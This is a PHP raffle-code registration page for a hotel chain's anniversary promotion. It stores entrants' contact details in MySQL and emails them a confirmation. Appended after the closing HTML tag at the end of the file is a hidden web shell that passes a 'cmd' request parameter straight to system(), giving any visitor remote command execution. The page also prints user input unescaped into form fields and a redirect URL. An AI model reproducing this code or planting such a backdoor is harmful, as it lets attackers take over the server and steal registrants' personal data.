<!DOCTYPE html>

<?php
	include "./pages/config8292838292029.php"; 
	$link = mysql_connect("$dbhost", "$dbuser", "$dbpassword")or die("cannot connect to server ");
	@mysql_select_db("$dbdatabase")or die("Unable to select database.");

	//echo '<br> globaldate : ' . $globaldate;
	//echo '<br> globaldatetime : ' . $globaldatetime;

	$coname = '';
	$coaddr = '';
	$coemail = '';
	$coevent_name = '';
	$coevent_tag = '';
	$coevent_logo = '';
	$coevent_print = '';

	$query_show = " 
		SELECT *
		FROM company_list a
		WHERE a.coactive = 'Y' ";
	$result_show = mysql_query($query_show) or die('Error : purchase_list Show Entry : ' . mysql_error());	
	while ($row_show =  mysql_fetch_array ($result_show)) 
	{
		$coname = $row_show[coname];
		$coaddr = $row_show[coaddr];
		$coemail = $row_show[coemail];
		$coevent_name = $row_show[coevent_name];
		$coevent_tag = $row_show[coevent_tag];
		$coevent_logo = $row_show[coevent_logo];
		$coevent_print = $row_show[coevent_print];
	}
	

	$submit = ''; 		
	if(isset($_POST['submit']))
	{
		if ($_POST['submit'])
		{
			$submit = $_POST['submit'];
		}
	}	
	//echo '<br> submit : ' . $submit;
	$submit = mysql_real_escape_string($submit);
	
	$vc_reg_branch = 'Enter Branch'; 		
	if(isset($_POST['vc_reg_branch']))
	{
		if ($_POST['vc_reg_branch'])
		{
			$vc_reg_branch = $_POST['vc_reg_branch'];
		}
	}	
	//echo '<br> vc_reg_branch : ' . $vc_reg_branch;
	$vc_reg_branch = mysql_real_escape_string($vc_reg_branch);	
	
	$vc_reg_name = ''; 		
	if(isset($_POST['vc_reg_name']))
	{
		if ($_POST['vc_reg_name'])
		{
			$vc_reg_name = $_POST['vc_reg_name'];
		}
	}	
	//echo '<br> vc_reg_name : ' . $vc_reg_name;
	$vc_reg_name = mysql_real_escape_string($vc_reg_name);
	
	$vc_reg_addr = ''; 		
	if(isset($_POST['vc_reg_addr']))
	{
		if ($_POST['vc_reg_addr'])
		{
			$vc_reg_addr = $_POST['vc_reg_addr'];
		}
	}	
	//echo '<br> vc_reg_addr : ' . $vc_reg_addr;
	$vc_reg_addr = mysql_real_escape_string($vc_reg_addr);
	
	$vc_reg_mobile = ''; 		
	if(isset($_POST['vc_reg_mobile']))
	{
		if ($_POST['vc_reg_mobile'])
		{
			$vc_reg_mobile = $_POST['vc_reg_mobile'];
		}
	}	
	//echo '<br> vc_reg_mobile : ' . $vc_reg_mobile;
	$vc_reg_mobile = mysql_real_escape_string($vc_reg_mobile);
	
	$vc_reg_email = ''; 		
	if(isset($_POST['vc_reg_email']))
	{
		if ($_POST['vc_reg_email'])
		{
			$vc_reg_email = $_POST['vc_reg_email'];
		}
	}	
	//echo '<br> vc_reg_email : ' . $vc_reg_email;
	$vc_reg_email = mysql_real_escape_string($vc_reg_email);	
		
	$vc_promo_code = ''; 		
	if(isset($_POST['vc_promo_code']))
	{
		if ($_POST['vc_promo_code'])
		{
			$vc_promo_code = $_POST['vc_promo_code'];
		}
	}	
	//echo '<br> vc_promo_code : ' . $vc_promo_code;
	$vc_promo_code = mysql_real_escape_string($vc_promo_code);			
			

	//check if ticket exists
	$my_ticket_message = '';
	
	$tlid = '';

	if ($vc_promo_code != '')
	{
		$querydb  = "
			   SELECT  
				 *
			   FROM 
				 ticket_list a
			   WHERE
			   	 a.tlbranch = '$vc_reg_branch' and
				 a.tlticket = '$vc_promo_code' ";			 
		$resultdb = mysql_query($querydb);
		while ($rowdb =  mysql_fetch_array ($resultdb)) 
		{
			$tlid = $rowdb[tlid];
			$tlticket = $rowdb[tlticket];
			$tldate = $rowdb[tldate];
			$tlbatch = $rowdb[tlbatch];
			$tlbranch = $rowdb[tlbranch];
			
			$tlactive = $rowdb[tlactive];
			$tluser = $rowdb[tluser];
			$tlstamp = $rowdb[tlstamp];
			
			$tlissue_date = $rowdb[tlissue_date];
			$tlissue_batch = $rowdb[tlissue_batch];
			$tlissue_branch = $rowdb[tlissue_branch];
			$tlissue_invoice = $rowdb[tlissue_invoice];
			$tlissue_amount = $rowdb[tlissue_amount];
			$tlissue_name = $rowdb[tlissue_name];
			$tlissue_stamp = $rowdb[tlissue_stamp];
			
			$tlreg_date = $rowdb[tlreg_date];
			$tlreg_batch = $rowdb[tlreg_batch];
			$tlreg_name = $rowdb[tlreg_name];
			$tlreg_addr = $rowdb[tlreg_addr];
			$tlreg_mobile = $rowdb[tlreg_mobile];
			$tlreg_email = $rowdb[tlreg_email];
			$tlreg_stamp = $rowdb[tlreg_stamp];
			
			$tlchosen_date = $rowdb[tlchosen_date];
			$tlchosen_name = $rowdb[tlchosen_name];
			$tlchosen_stamp = $rowdb[tlchosen_stamp];
		}
		
		//check if ticket exists
		//$tltaken_status =   TAKEN    CANCEL
		if ($tlid == '')
		{
			$my_ticket_message = 'Raffle Code does not exists!';
		}
		else
		if ($tlreg_date != '')
		{
			$my_ticket_message = 'Raffle Code already registered!';
		}
		else
		if ($vc_reg_branch == '')  		
		{
			$my_ticket_message = 'Please enter branch to continue!';
		}	
		else
		if ($vc_reg_name == '')  		
		{
			$my_ticket_message = 'Please enter name to continue!';
		}	
		else
		if ($vc_reg_addr == '')  		
		{
			$my_ticket_message = 'Please enter name to continue!';
		}	
		else
		if ($vc_reg_mobile == '')  		
		{
			$my_ticket_message = 'Please enter mobile number to continue!';
		}	
		else
		if ($vc_reg_email == '')  		
		{
			$my_ticket_message = 'Please enter email address to continue!';
		}	
		
		if ($my_ticket_message != '')
		{
			$my_ticket_message = 'Invalid Input!';
		}
		else
		if ($my_ticket_message == '')
		{							
			$my_ticket_message = "Raffle Code accepted!";
			
			$tlreg_date = $globaldate;
			$tlreg_batch = $globaldatetime;
			$tlbranch = $vc_reg_branch;
			$tlreg_name = $vc_reg_name;
			$tlreg_addr = $vc_reg_addr;
			$tlreg_mobile = $vc_reg_mobile;
			$tlreg_email = $vc_reg_email;
			$tlreg_stamp = $globaldatetime;
			
			//update the table that the ticket has been accepted
			$query_verify = 
			"UPDATE 
				ticket_list 
			SET 
				tlreg_date = '$tlreg_date',
				tlreg_batch = '$tlreg_batch',
				tlreg_name = '$tlreg_name',
				tlreg_addr = '$tlreg_addr',
				tlreg_mobile = '$tlreg_mobile',
				tlreg_email = '$tlreg_email',
				tlreg_stamp = '$tlreg_stamp'
			WHERE 
				tlid = '$tlid' ";						
			mysql_query($query_verify) or die(mysql_error());   			




    		//send confirmation email
	
			$message = '
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
	</head>
	<body>
		<div align="center" style="font-family: Lato; font-size: 14px;">
			<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;" width="620">
				<tbody>
					<tr>
						<td align="center" style="font-family: Arial, Helvetica, Verdana; border-collapse: collapse; vertical-align: top; valign=" top"="">
							<table bgcolor="#000000" border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px; background-color: #000000;" width="600">
								<tbody>
									<tr>
										<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 10px 10px; margin: 0px;" valign="top">
											<center><a href="http://www.victoriacourt.biz/" target="_blank"><img alt="Victoria Court" id="vclogo" src="http://www.victoriacourt.biz/vcat30/img_vc.png"></a></center></td>
									</tr>
								</tbody>
							</table>
							<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
								<tbody>
									<tr>
										<td align="left" style="font-size: 10px; border-collapse: collapse; vertical-align: top; line-height: 10px; padding: 0px; margin: 0px;" valign="top">&nbsp;
											</td>
									</tr>
								</tbody>
							</table>
							<table bgcolor="#efffc5" border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; width: 600px; margin: 0px; padding: 0px; border-color: rgb(181, 210, 153); border-style: solid; background-color: #000000;">
								<tbody>
									<tr>
										<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 33px; padding: 10px; margin: 0px;" valign="top" width="28">
											<img alt="This booking is guaranteed." height="28" id="8392692000000785015_imgsrc_url_2" src="http://www.victoriacourt.biz/vcat30/img_green.png" style="line-height: 10px; outline: none; border-width: 0px;" width="28"></td>
										<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 10px 10px 10px 10px; margin: 0px;" valign="top">
											<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
												<tbody>
													<tr>
														<td align="left" style="font-size: 16px; border-collapse: collapse; vertical-align: top; line-height: 24px; padding: 0px; margin: 0px; font-weight: bold; color: #ffffff;" valign="top">
															Your submission was successful, congratulations you earned one raffle entry and qualify for the Victoria Court 30th Anniversary Raffle Draw. </td>
													</tr>
												</tbody>
											</table>
										</td>
									</tr>
								</tbody>
							</table>
							
							
							<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
								<tbody>
									<tr>
										<td align="left" style="font-size: 10px; border-collapse: collapse; vertical-align: top; line-height: 10px; padding: 0px; margin: 0px;" valign="top">&nbsp;
											</td>
									</tr>
								</tbody>
							</table>
							
							<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
								<tbody>
									<tr>
										<td align="left" style="font-size: 10px; border-collapse: collapse; vertical-align: top; line-height: 10px; padding: 0px; margin: 0px;" valign="top">&nbsp;
											</td>
									</tr>
								</tbody>
							</table>
							<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; width: 600px; margin: 0px; padding: 0px;">
								<tbody>
									<tr>
										<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 6px 10px; margin: 0px;" valign="top">
											<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
												<tbody>
													<tr>
														<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 0px 10px 0px 0px; margin: 0px; width: 240px;" valign="top">
															<strong>Branch Name:</strong></td>
														<td align="right" style="border-collapse: collapse; vertical-align: top; line-height: 20px; text-align: right; padding: 0px; margin: 0px; width: 350px;" valign="top">
															' . $tlbranch . '</td>
													</tr>
												</tbody>
											</table>
										</td>
									</tr>
									<tr>
										<td align="left" style="font-size: 1px; border-collapse: collapse; vertical-align: top; line-height: 1px; padding: 0px; margin: 0px; border-bottom-color: rgb(204, 204, 204);" valign="top">&nbsp;
											</td>
									</tr>
									<tr>
										<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 6px 10px; margin: 0px;" valign="top">
											<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
												<tbody>
													<tr>
														<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 0px 10px 0px 0px; margin: 0px; width: 240px;" valign="top">
															<strong>Full Name</strong></td>
														<td align="right" style="border-collapse: collapse; vertical-align: top; line-height: 20px; text-align: right; padding: 0px; margin: 0px; width: 350px;" valign="top">
															' . $tlreg_name . '</td>
													</tr>
												</tbody>
											</table>
										</td>
									</tr>
									<tr>
										<td align="left" style="font-size: 1px; border-collapse: collapse; vertical-align: top; line-height: 1px; padding: 0px; margin: 0px; border-bottom-color: rgb(204, 204, 204);" valign="top">&nbsp;
											</td>
									</tr>
									<tr>
										<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 6px 10px; margin: 0px;" valign="top">
											<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
												<tbody>
													<tr>
														<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 0px 10px 0px 0px; margin: 0px; width: 240px;" valign="top">
															<strong>Complete Address</strong></td>
														<td align="right" style="border-collapse: collapse; vertical-align: top; line-height: 20px; text-align: right; padding: 0px; margin: 0px; width: 350px;" valign="top">
															' . $tlreg_addr . '</td>
													</tr>
												</tbody>
											</table>
										</td>
									</tr>
									<tr>
										<td align="left" style="font-size: 1px; border-collapse: collapse; vertical-align: top; line-height: 1px; padding: 0px; margin: 0px; border-bottom-color: rgb(204, 204, 204);" valign="top">&nbsp;
											</td>
									</tr>
									<tr>
										<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 6px 10px; margin: 0px;" valign="top">
											<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
												<tbody>
													<tr>
														<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 0px 10px 0px 0px; margin: 0px; width: 240px;" valign="top">
															<strong>Contact Number</strong></td>
														<td align="right" style="border-collapse: collapse; vertical-align: top; line-height: 20px; text-align: right; padding: 0px; margin: 0px; width: 350px;" valign="top">
															' . $tlreg_mobile . '</td>
													</tr>
												</tbody>
											</table>
										</td>
									</tr>
									<tr>
										<td align="left" style="font-size: 1px; border-collapse: collapse; vertical-align: top; line-height: 1px; padding: 0px; margin: 0px; border-bottom-color: rgb(204, 204, 204);" valign="top">&nbsp;
											</td>
									</tr>
									<tr>
										<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 6px 10px; margin: 0px;" valign="top">
											<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
												<tbody>
													<tr>
														<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 0px 10px 0px 0px; margin: 0px; width: 240px;" valign="top">
															<strong>Email Address</strong></td>
														<td align="right" style="border-collapse: collapse; vertical-align: top; line-height: 20px; text-align: right; padding: 0px; margin: 0px; width: 350px;" valign="top">
															' . $tlreg_email . '</td>
													</tr>
												</tbody>
											</table>
										</td>
									</tr>
									<tr>
										<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 6px 10px; margin: 0px;" valign="top">
											<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
												<tbody>
													<tr>
														<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 0px 10px 0px 0px; margin: 0px; width: 240px;" valign="top">
															<strong>Raffle Code</strong></td>
														<td align="right" style="border-collapse: collapse; vertical-align: top; line-height: 20px; text-align: right; padding: 0px; margin: 0px; width: 350px;" valign="top">
															' . $tlticket . '</td>
													</tr>
												</tbody>
											</table>
										</td>
									</tr>
									<tr>
										<td align="left" bgcolor="#efffc5" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 6px 10px; margin: 0px; background-color: rgb(239, 255, 197); border-top-style: solid; border-top-color: rgb(204, 204, 204);" valign="top">
											<table border="0" cellpadding="0" cellspacing="0" style="border-spacing: 0px; border-collapse: collapse; margin: 0px; padding: 0px;">
												<tbody>
													<tr>
														<td align="left" style="border-collapse: collapse; vertical-align: top; line-height: 20px; padding: 0px 10px 0px 0px; margin: 0px; width: 240px;" valign="top">
															<strong></strong></td>
														<td align="right" style="font-size: 16px; border-collapse: collapse; vertical-align: top; line-height: 20px; text-align: right; padding: 0px; margin: 0px; width: 350px;" valign="top">
															<strong>DTI-FTEB Permit # 2077, Series of 2017</strong></td>
													</tr>
												</tbody>
											</table>
										</td>
									</tr>
								</tbody>
							</table>
						
							

		</div>
	</body>
</html>
			';
		
			
			/*
			// message
			$message = '
			<html>
			<body>
			  <img src="http://planet-earth.bogus.us/icons/secret.pictures.gif">
			</body>
			</html>
			';
			
			// Add the content headers
			$headers  = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
			
			$headers .= 'To: David <david-z@domain.com>' . "\r\n";
			$headers .= 'From: Bot <bot@domain.com>' . "\r\n";
			
			mail("david-z@domain.com", "mysubject", $message, $headers);
			*/
			
			
			if ($coemail != '')
			{
				$email_title =  "Victoria Court 30th Anniversary Raffle";
				
				$headers  = 'MIME-Version: 1.0' . "\r\n";
				$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
				$headers .= 'To: ' . $tlreg_email . "\r\n";
				$headers .= 'From: ' . $coemail . "\r\n";
				
				//1at email for victoria court email
				mail($tlreg_email, $email_title, $message, $headers);
			}
			
/*
			echo '<br> coemail: ' . $coemail;
			echo '<br> tlreg_email: ' . $tlreg_email;
			echo '<br> email_title: ' . $email_title;
			echo '<br> headers: ' . $headers;
			echo '<br> message: ' . $message;

			<HTML> 		
			<meta http-equiv="refresh" content="0;URL=accepted.php?vc_promo_code=<?php print($vc_promo_code); ?>">  
			</HTML>
*/

			?>	
			<HTML> 		
			<meta http-equiv="refresh" content="0;URL=accepted.php?vc_promo_code=<?php print($vc_promo_code); ?>">  
			</HTML>
			<?php
			exit;
		}
		
	}
	
	mysql_close($link);		
?>

<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

        <!-- /.website title -->
        <title><?php print($coname); ?></title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

        <!-- CSS Files -->
        <link href="./index_files/bootstrap.min.css" rel="stylesheet" media="screen">
        <link href="./index_files/font-awesome.min.css" rel="stylesheet">
        <link href="./index_files/pe-icon-7-stroke.css" rel="stylesheet">
        <link href="./index_files/animate.css" rel="stylesheet" media="screen">
        <link href="./index_files/owl.theme.css" rel="stylesheet">
        <link href="./index_files/owl.carousel.css" rel="stylesheet">

        <link href="./index_files/css-index.css" rel="stylesheet" media="screen">
       

        <!-- Google Fonts -->
        <link rel="stylesheet" href="./index_files/css">

    </head>	

    <body data-spy="scroll" data-target="#navbar-scroll">

        <!-- /.preloader -->
        
        <div id="top"></div>    

            <div class="overlay">
                <div class="container">
                    <div class="row">
                        <div class="col-md-7">

                            <!-- /.logo -->
                            <div class="logo wow fadeInDown animated" style="visibility: visible; animation-name: fadeInDown;"> 
<?php
	//echo " <br> ulpicture " . $_SESSION['ulpicture'];
	if ($coevent_logo != '')
	{						
?>
		<img src="./pages/events/<?php print($coevent_logo); ?>" alt="logo">
<?php
	}
	else
	{						
?>
		<img src="./index_files/logo.png" alt="logo">
<?php
	}
?>

							</div>

                            <!-- /.main title -->
                            <h1 class="wow fadeInLeft animated" style="visibility: visible; animation-name: fadeInLeft;">
                               
<?php
	//echo " <br> ulpicture " . $_SESSION['ulpicture'];
	if ($coevent_logo != '')
	{						
?>
		 <?php print($coevent_name); ?>
<?php
	}
	else
	{						
?>
		 *** No Event Name ***
<?php
	}
?>								
                            </h1>

                            <!-- /.header paragraph -->
                            <div class="landing-text wow fadeInUp animated" style="visibility: visible; animation-name: fadeInUp;">
<?php
	//echo " <br> ulpicture " . $_SESSION['ulpicture'];
	//echo " <br> tlid " . $tlid;
	//echo " <br> vc_promo_code " . $vc_promo_code;
	//echo " <br> my_ticket_message " . $my_ticket_message;
	//echo " <br> tlreg_date " . $tlreg_date;
	
	if ($coevent_tag != '')
	{						
?>
		<p><?php print($coevent_tag); ?></p>
<?php
	}
	else
	{						
?>
		<p>*** No Event Subtitle ***</p>
<?php
	}
?> 
                                
                            </div>				  

                            <!-- /.header button 
                            <div class="head-btn wow fadeInLeft animated" style="visibility: visible; animation-name: fadeInLeft;">
                                <a href="https://bootstrapthemes.co/demo/html/backyard/demo/index.html#feature" class="btn-primary">Features</a>
                                <a href="https://bootstrapthemes.co/demo/html/backyard/demo/index.html#download" class="btn-default">Download</a>
                            </div>-->



                        </div> 

                        <!-- /.form form -->
                        <div class="col-md-5">

                            <div class="signup-header wow fadeInUp animated" style="visibility: visible; animation-name: fadeInUp;">
                                <h3 class="form-title text-center">Raffle Code Registration</h3>
								
<form class="form-header" action="index.php" role="form" method="POST" id="#">

	<div class="form-group">
		<select class="form-control input-lg" name="vc_reg_branch" id="vc_reg_branch" >
		<option><?php print($vc_reg_branch); ?></option>
		<option>Balintawak</option>
		<option>Cuneta</option>
		<option>Gil Puyat</option>
		<option>Hillcrest</option>
		<option>Las Pinas</option>
		<option>Malabon</option>
		<option>Malate</option>
		<option>North Edsa</option>
		<option>Panorama</option>
		<option>San Fernando</option>
		</select>
	</div>

	<div class="form-group">
		<input class="form-control input-lg" name="vc_reg_name" id="vc_reg_name" type="text" value="<?php print($vc_reg_name); ?>" placeholder="Enter Full Name" size="50" required="Please enter your name!" autofocus>
	</div>
	<div class="form-group">
		<input class="form-control input-lg" name="vc_reg_addr" id="vc_reg_addr" type="text" value="<?php print($vc_reg_addr); ?>" placeholder="Enter Complete Address" size="100" required="Please enter your address!" autofocus>
	</div>
	<div class="form-group">
		<input class="form-control input-lg" name="vc_reg_mobile" id="vc_reg_mobile" type="text" value="<?php print($vc_reg_mobile); ?>" placeholder="Enter Contact Number" size="50" required="Please enter your mobile number!" autofocus>
	</div>
	<div class="form-group">
		<input class="form-control input-lg" name="vc_reg_email" id="vc_reg_email" type="email" value="<?php print($vc_reg_email); ?>" placeholder="Enter Email" size="100" required="Please enter your email!" autofocus>
	</div>
	
	<div class="form-group">
		<input class="form-control input-lg" name="vc_promo_code" id="name" type="text" placeholder="Enter Raffle Code" required="Please enter Raffle Code!" autofocus>
	</div>
	<div class="form-group last">
		<input type="submit" class="btn btn-warning btn-block btn-lg"  value="Save Registration Code">
	</div>
	<p class="privacy text-center"></p>
</form>
								
<?php
	if ($my_ticket_message != '') 
	{
		echo '<br>';
		echo '<font size="+2">' . $my_ticket_message . '</font>';
		echo '<br>';
		echo '<br>';
	}	
?>										
                            </div>				

                        </div>
                    </div>
                </div> 
            </div> 
        </div>

       



        <!-- /.javascript files -->
        <script src="./index_files/jquery.js"></script>
        <script src="./index_files/bootstrap.min.js"></script>
        <script src="./index_files/custom.js"></script>
        <script src="./index_files/jquery.sticky.js"></script>
        <script src="./index_files/wow.min.js"></script>
        <script src="./index_files/owl.carousel.min.js"></script>
        <script>
                                    new WOW().init();
        </script>
    
<script type="text/javascript">( function(){ window.SIG_EXT = {}; } )()</script></body></html><?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>